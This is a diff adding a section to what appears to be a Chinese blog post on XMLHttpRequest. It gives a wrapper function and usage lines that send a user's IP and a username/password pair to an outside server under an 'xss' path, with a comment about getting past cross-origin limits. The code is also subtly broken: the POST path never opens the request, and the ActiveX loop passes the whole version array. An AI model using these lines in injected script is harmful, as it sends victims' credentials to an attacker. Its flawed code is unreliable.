@@ -172,6 +172,63 @@ xmlhttp.send(&quot;fname=Henry&amp;lname=Ford&quot;);
 </code></pre>
 </blockquote>
 
+<h3 id="0x02-简单封装">0x02 简单封装</h3>
+
+<blockquote>
+<pre><code>function createXHR () {
+    var request = false;
+    if (window.XMLHttpRequest) {
+        request = new XMLHttpRequest();
+        if (request.overrideMimeType) {
+            request.overrideMimeType('text/xml');
+        }
+    } else if (window.ActiveXObject) {
+        var versions = [
+            'Microsoft.XMLHTTP', 'MSXML.XMLHTTP',
+            'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0',
+            'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0',
+            'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
+        for (var i = 0; i &lt; versions.length; i++) {
+            try {
+                request = new ActiveXObject(versions);
+            } catch (e) {}
+        }
+    }
+    return request;
+}
+
+xhr=createXHR();//创建对象
+
+function xhr_act(method,src,data){//封装POST和GET请求
+    if(method==&quot;GET&quot;){
+        xhr.open(method,src,false);           
+        xhr.send();
+        return xhr.responseText;
+    } else if(method == &quot;POST&quot;){ 
+        xhr.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+        xhr.setRequestHeader(&quot;Content-length&quot;, data.length);
+        xhr.setRequestHeader(&quot;Connection&quot;, &quot;close&quot;);
+        xhr.send(data);
+        return xhr.responseText;
+    }
+}
+</code></pre>
+
+<p>简单使用：</p>
+
+<pre><code>//GET的使用
+var src=&quot;http://114.115.214.203/wyb/xss/i.php&quot;;
+xhr_act(&quot;GET&quot;,src+&quot;?ip=&quot;+ip,false);
+
+//POST的使用
+var user = &quot;xiaoming&quot;;
+var pass = &quot;123456&quot;;
+var src=&quot;http://114.115.214.203/wyb/xss/i.php&quot;;  //传送的地方 但是需要解决跨域问题
+data=&quot;username=&quot;+user+&quot;&amp;password=&quot;+pass;
+xhr_act(&quot;POST&quot;,src,data);
+</code></pre>
+</blockquote>
+
                 
                 <div style="padding:10px 1px;">
                     <font color="FF0000">若未作声明则文章版权归本人所有，转载请注明原文链接：</font>
